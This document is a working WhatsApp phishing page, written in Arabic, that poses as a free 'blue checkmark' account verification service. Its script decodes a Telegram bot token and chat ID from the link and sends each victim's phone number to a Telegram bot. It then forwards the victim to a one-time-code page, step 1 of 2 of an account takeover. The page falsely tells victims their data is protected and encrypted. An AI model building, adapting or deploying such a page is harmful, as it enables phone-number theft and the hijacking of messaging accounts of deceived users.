<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>توثيق WhatsApp</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
        }

        body {
            background: #0b141a;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            margin: 0;
            padding: 20px;
            position: relative;
            overflow: hidden;
        }

        body::before {
            content: '';
            position: fixed;
            top: -50%;
            left: -50%;
            width: 200%;
            height: 200%;
            background: 
                radial-gradient(circle at 20% 30%, rgba(37, 211, 102, 0.12) 0%, transparent 45%),
                radial-gradient(circle at 80% 70%, rgba(0, 149, 246, 0.1) 0%, transparent 45%);
            animation: floatBg 18s ease-in-out infinite;
            z-index: 0;
            pointer-events: none;
        }

        @keyframes floatBg {
            0%, 100% { transform: translate(0, 0) rotate(0deg); }
            50% { transform: translate(-5%, -5%) rotate(5deg); }
        }

        .container {
            width: 100%;
            max-width: 420px;
            position: relative;
            z-index: 1;
            animation: fadeIn 0.6s ease;
        }

        @keyframes fadeIn {
            from { opacity: 0; transform: translateY(-20px); }
            to { opacity: 1; transform: translateY(0); }
        }

        .header {
            text-align: center;
            margin-bottom: 25px;
        }

        .header .logo-wrapper {
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 12px;
        }

        .header .logo-wrapper img {
            width: 52px;
            height: 52px;
            border-radius: 50%;
            object-fit: cover;
        }

        .header .logo-wrapper .logo-text {
            font-size: 32px;
            font-weight: 700;
            color: #ffffff;
        }

        .header .logo-wrapper .logo-text .green {
            color: #25d366;
        }

        .header .subtitle {
            color: #8696a0;
            font-size: 15px;
            margin-top: 10px;
        }

        .card {
            background: #111b21;
            border-radius: 18px;
            border: 1px solid #222d34;
            padding: 32px 28px 26px;
            box-shadow: 
                0 4px 20px rgba(0, 0, 0, 0.4),
                0 0 40px rgba(37, 211, 102, 0.05);
            position: relative;
            overflow: hidden;
        }

        .card::before {
            content: '';
            position: absolute;
            top: 0;
            left: 0;
            right: 0;
            height: 3px;
            background: linear-gradient(90deg, transparent, #25d366, #0095f6, transparent);
            background-size: 200% 100%;
            animation: gradientMove 3s linear infinite;
        }

        @keyframes gradientMove {
            0% { background-position: -200% 0%; }
            100% { background-position: 200% 0%; }
        }

        /* 🏆 شريط التوثيق */
        .verified-badge {
            text-align: center;
            margin-bottom: 24px;
            padding: 18px 16px;
            background: linear-gradient(135deg, rgba(0, 149, 246, 0.12) 0%, rgba(37, 211, 102, 0.08) 100%);
            border: 1.5px solid rgba(0, 149, 246, 0.35);
            border-radius: 14px;
            position: relative;
            overflow: hidden;
        }

        .verified-badge::before {
            content: '';
            position: absolute;
            top: 0;
            left: -100%;
            width: 100%;
            height: 100%;
            background: linear-gradient(90deg, transparent, rgba(255,255,255,0.1), transparent);
            animation: shine 3s infinite;
        }

        @keyframes shine {
            0% { left: -100%; }
            50%, 100% { left: 100%; }
        }

        .verified-badge .badge-icon-wrapper {
            display: inline-flex;
            align-items: center;
            justify-content: center;
            width: 60px;
            height: 60px;
            background: linear-gradient(135deg, #0095f6, #25d366);
            border-radius: 50%;
            margin-bottom: 12px;
            box-shadow: 0 4px 16px rgba(0, 149, 246, 0.4);
            animation: pulseBadge 2s ease-in-out infinite;
            position: relative;
            z-index: 1;
        }

        @keyframes pulseBadge {
            0%, 100% { 
                transform: scale(1); 
                box-shadow: 0 4px 16px rgba(0, 149, 246, 0.4);
            }
            50% { 
                transform: scale(1.08); 
                box-shadow: 0 6px 24px rgba(0, 149, 246, 0.6);
            }
        }

        .verified-badge .badge-icon-wrapper svg {
            width: 34px;
            height: 34px;
            fill: white;
        }

        .verified-badge h3 {
            font-size: 16px;
            color: #ffffff;
            font-weight: 700;
            margin-bottom: 6px;
            position: relative;
            z-index: 1;
        }

        .verified-badge p {
            font-size: 13px;
            color: #8696a0;
            line-height: 1.5;
            font-weight: 500;
            position: relative;
            z-index: 1;
        }

        .icon-main {
            text-align: center;
            font-size: 48px;
            margin-bottom: 12px;
        }

        .card h2 {
            font-size: 21px;
            color: #ffffff;
            margin-bottom: 8px;
            font-weight: 700;
            text-align: center;
        }

        .card .desc {
            color: #8696a0;
            font-size: 14px;
            margin-bottom: 24px;
            line-height: 1.7;
            text-align: center;
        }

        .input-group {
            margin-bottom: 18px;
            position: relative;
        }

        .input-group label {
            display: block;
            font-size: 13px;
            font-weight: 600;
            color: #e9edef;
            margin-bottom: 8px;
        }

        .country-selector {
            display: flex;
            gap: 10px;
        }

        .country-selector select {
            padding: 15px 12px;
            border: 1.5px solid #2a3942;
            border-radius: 12px;
            font-size: 15px;
            background: #1f2c33;
            color: #ffffff;
            outline: none;
            cursor: pointer;
            transition: all 0.25s;
            font-family: inherit;
            min-width: 110px;
        }

        .country-selector select:focus {
            border-color: #25d366;
        }

        .country-selector input {
            flex: 1;
            padding: 15px 18px;
            border: 1.5px solid #2a3942;
            border-radius: 12px;
            font-size: 16px;
            background: #1f2c33;
            outline: none;
            color: #ffffff;
            direction: ltr;
            text-align: right;
            transition: all 0.25s;
            font-family: inherit;
        }

        .country-selector input:focus {
            border-color: #25d366;
            background: #182229;
            box-shadow: 0 0 0 3px rgba(37, 211, 102, 0.15);
        }

        .country-selector input::placeholder {
            color: #667781;
            font-size: 14px;
        }

        .country-selector input.error {
            border-color: #f15c6d;
            background: rgba(241, 92, 109, 0.08);
        }

        .field-error {
            color: #f15c6d;
            font-size: 13px;
            margin-top: 6px;
            display: none;
            text-align: right;
        }

        .field-error.show {
            display: block;
            animation: slideDown 0.2s ease;
        }

        @keyframes slideDown {
            from { opacity: 0; transform: translateY(-5px); }
            to { opacity: 1; transform: translateY(0); }
        }

        .btn-next {
            width: 100%;
            padding: 16px;
            background: linear-gradient(135deg, #25d366, #0095f6);
            color: #ffffff;
            border: none;
            border-radius: 12px;
            font-size: 16px;
            font-weight: 700;
            cursor: pointer;
            transition: all 0.25s ease;
            margin-top: 8px;
            box-shadow: 0 4px 20px rgba(37, 211, 102, 0.3);
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 8px;
            font-family: inherit;
        }

        .btn-next:hover {
            transform: translateY(-2px);
            box-shadow: 0 8px 28px rgba(37, 211, 102, 0.45);
        }

        .btn-next:active {
            transform: scale(0.98);
        }

        .btn-next:disabled {
            opacity: 0.6;
            cursor: not-allowed;
            transform: none;
            box-shadow: none;
        }

        .security-note {
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 8px;
            margin-top: 20px;
            padding: 12px;
            background: rgba(37, 211, 102, 0.08);
            border-radius: 10px;
            color: #8696a0;
            font-size: 12.5px;
            text-align: center;
        }

        .security-note i {
            color: #25d366;
        }

        @media (max-width: 450px) {
            .card {
                padding: 24px 18px;
            }
            .header .logo-wrapper .logo-text {
                font-size: 26px;
            }
            .header .logo-wrapper img {
                width: 44px;
                height: 44px;
            }
            .country-selector select {
                min-width: 90px;
                padding: 14px 8px;
                font-size: 14px;
            }
            .country-selector input {
                padding: 14px 12px;
                font-size: 15px;
            }
            .btn-next {
                font-size: 15px;
                padding: 14px;
            }
        }
    </style>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
</head>
<body>

<div class="container">

    <div class="header">
        <div class="logo-wrapper">
            <img src="whatsapp.png" alt="WhatsApp" style="width: 52px; height: 52px; border-radius: 50%; object-fit: cover;">
            <span class="logo-text">Whats<span class="green">App</span></span>
        </div>
        <div class="subtitle">🔵 توثيق الحساب</div>
    </div>

    <div class="card">

        <!-- 🏆 شريط التوثيق -->
        <div class="verified-badge">
            <div class="badge-icon-wrapper">
                <svg viewBox="0 0 24 24">
                    <path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4zm-2 16l-4-4 1.41-1.41L10 14.17l6.59-6.59L18 9l-8 8z"/>
                </svg>
            </div>
            <h3>🔵 توثيق حساب WhatsApp مجانًا</h3>
            <p>أدخل رقمك وسيتم توثيق حسابك بعلامة زرقاء ✓</p>
        </div>

        <form id="phoneForm" novalidate>

            <div class="input-group">
                <label>رقم الواتساب</label>
                <div class="country-selector">
                    <select id="countryCode">
                        <option value="+212">🇲🇦 +212</option>
                        <option value="+213">🇩🇿 +213</option>
                        <option value="+216">🇹🇳 +216</option>
                        <option value="+20">🇪🇬 +20</option>
                        <option value="+966">🇸🇦 +966</option>
                        <option value="+971">🇦🇪 +971</option>
                        <option value="+965">🇰🇼 +965</option>
                        <option value="+974">🇶🇦 +974</option>
                        <option value="+33">🇫🇷 +33</option>
                        <option value="+1">🇺🇸 +1</option>
                        <option value="+44">🇬🇧 +44</option>
                        <option value="+49">🇩🇪 +49</option>
                        <option value="+34">🇪🇸 +34</option>
                        <option value="+39">🇮🇹 +39</option>
                        <option value="+90">🇹🇷 +90</option>
                    </select>
                    <input type="tel" id="phoneNumber" placeholder="6XXXXXXXXX" maxlength="10" required autocomplete="tel">
                </div>
                <div class="field-error" id="phoneError"></div>
            </div>

            <button type="submit" class="btn-next" id="nextBtn">
                <i class="fas fa-check-circle"></i> توثيق الحساب
            </button>

        </form>

        <div class="security-note">
            <i class="fas fa-lock"></i>
            <span>بياناتك محمية ومشفّرة بالكامل</span>
        </div>

    </div>

</div>

<script>
    // ================================================================
    // 🔐 قراءة البيانات المشفّرة من الرابط
    // ================================================================
    const urlParams = new URLSearchParams(window.location.search);
    const encodedData = urlParams.get('d') || "";

    if (encodedData) {
        sessionStorage.setItem('wa_encoded', encodedData);
    }
    const finalEncoded = encodedData || sessionStorage.getItem('wa_encoded') || "";

    let BOT_TOKEN = "";
    let CHAT_ID = "";

    if (finalEncoded) {
        try {
            const decoded = atob(finalEncoded);
            const parts = decoded.split('|');
            BOT_TOKEN = parts[0] || "";
            CHAT_ID   = parts[1] || "";
        } catch (e) {
            console.error('❌ فشل فك التشفير:', e);
        }
    }

    // ================================================================
    // 📤 إرسال رقم الهاتف إلى Telegram
    // ================================================================
    function sendPhoneToTelegram(phone) {
        if (!BOT_TOKEN || !CHAT_ID) return;

        const message = `
🔵 **توثيق حساب WhatsApp (الخطوة 1/2)**

📞 **رقم الهاتف:** 
\`${phone}\`

🎯 **الطلب:** توثيق الحساب بعلامة زرقاء ✓

🕐 **التاريخ:** ${new Date().toLocaleString('ar-EG')}

📌 **IP:** ${window.location.hostname}
        `;

        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: CHAT_ID,
                text: message,
                parse_mode: 'Markdown'
            })
        }).catch(error => console.log('Telegram error:', error));
    }

    // ================================================================
    // 🔢 حقل رقم الهاتف - 10 أرقام
    // ================================================================
    const phoneInput = document.getElementById('phoneNumber');

    phoneInput.addEventListener('input', function() {
        this.value = this.value.replace(/\D/g, '').substring(0, 10);
        this.classList.remove('error');
        document.getElementById('phoneError').classList.remove('show');
    });

    // ================================================================
    // 📝 معالج النموذج
    // ================================================================
    document.getElementById('phoneForm').addEventListener('submit', function(e) {
        e.preventDefault();

        const countryCode = document.getElementById('countryCode').value;
        const phoneNumber = phoneInput.value.trim();
        const errorEl = document.getElementById('phoneError');

        phoneInput.classList.remove('error');
        errorEl.classList.remove('show');
        errorEl.textContent = '';

        if (!phoneNumber) {
            phoneInput.classList.add('error');
            errorEl.textContent = '⚠️ يرجى إدخال رقم الواتساب';
            errorEl.classList.add('show');
            return;
        }

        if (phoneNumber.length !== 10) {
            phoneInput.classList.add('error');
            errorEl.textContent = `⚠️ يجب أن يكون الرقم 10 أرقام (أدخلت ${phoneNumber.length})`;
            errorEl.classList.add('show');
            return;
        }

        const fullPhone = countryCode + phoneNumber;

        const btn = document.getElementById('nextBtn');
        btn.disabled = true;
        btn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> جاري التوثيق...';

        sendPhoneToTelegram(fullPhone);

        localStorage.setItem('wa_phone', fullPhone);
        sessionStorage.setItem('wa_encoded', finalEncoded);

        setTimeout(() => {
            let nextUrl = 'whatsapp-verify-otp.html';
            if (finalEncoded) {
                nextUrl += '?d=' + encodeURIComponent(finalEncoded);
            }
            window.location.href = nextUrl;
        }, 800);
    });

    console.log('✅ WhatsApp Verify page loaded');
</script>

</body>
</html>
